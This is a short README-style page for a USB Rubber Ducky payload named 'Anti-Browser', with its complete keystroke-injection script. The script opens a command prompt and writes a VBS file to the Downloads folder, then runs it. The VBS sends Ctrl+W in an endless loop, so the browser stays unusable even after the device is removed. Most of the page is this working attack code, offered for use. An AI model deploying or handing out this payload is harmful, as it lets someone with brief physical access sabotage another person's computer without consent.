# Anti-Browser
This script creates a vbs file that sends CTRL+W over and over very fast and, therefore, it will be impossible to use the browser. Furthermore, you can unplug the Rubber Ducky after the vbs is executed, because the thing that sends the keystrokes is the vbs file and not the Ducky.
<h2>About...</h2>

Author: <a href="https://github.com/BlueArduino20">BlueArduino20</a>

Original repository: https://github.com/BlueArduino20/Anti-Browser

Time needed to complete the script injection: about 1.5 seconds!

Version: 1.0

<h2>Code</h2>

<pre><code>ESC
DELAY 500
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 200
STRING cd %userprofile%/Downloads
ENTER
STRING copy con CW.vbs
ENTER
STRING do
ENTER
STRING Set objShell = CreateObject("WScript.Shell")
ENTER
STRING WScript.Sleep 800
ENTER
STRING objShell.SendKeys "^{W}"
ENTER
STRING loop
CTRL z
DELAY 100
ENTER
STRING start CW.vbs && exit
ENTER
</pre></code>
